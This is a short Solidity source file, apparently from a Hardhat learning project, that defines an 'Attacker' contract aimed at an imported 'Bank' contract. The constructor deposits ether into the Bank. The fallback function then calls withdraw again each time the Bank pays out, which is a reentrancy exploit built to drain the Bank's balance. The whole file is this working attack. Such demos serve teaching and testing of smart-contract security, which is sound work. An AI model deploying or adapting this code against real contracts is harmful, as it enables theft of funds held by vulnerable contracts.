// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

import "./Bank.sol";
import "hardhat/console.sol";

contract Attacker {

    Bank private victimContract;

    constructor(address victimAddress) payable{
        victimContract = Bank(payable(victimAddress));
        victimContract.deposit{value:msg.value}();
    }

    function withdraw() external payable{
        victimContract.withdraw(1 ether);
    }

    fallback() external payable{
        victimContract.withdraw(1 ether);
    }
}